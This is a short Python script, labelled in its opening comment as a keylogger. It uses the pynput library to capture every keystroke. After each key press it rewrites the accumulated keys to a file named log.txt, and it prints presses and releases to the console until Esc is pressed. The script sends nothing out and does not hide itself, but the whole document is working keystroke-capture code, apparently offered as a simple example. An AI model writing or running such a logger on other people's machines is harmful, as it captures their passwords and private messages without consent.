# keylogger using pynput module
from pynput.keyboard import Key, Listener

keys = []
S = "aa"


def on_press(key):
    keys.append(key)
    # ' '.join((S, key))
    write_file(keys, "log.txt")
    # write_file(S, "log_2.txt")

    try:
        print('\nalphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        print('\nspecial key {0} pressed'.format(key))


def write_file(keys, path):
    with open(path, 'w') as f:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)

            # explicitly adding a space after
            # every keystroke for readability
            f.write('\n')
        f.close()


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False


with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()
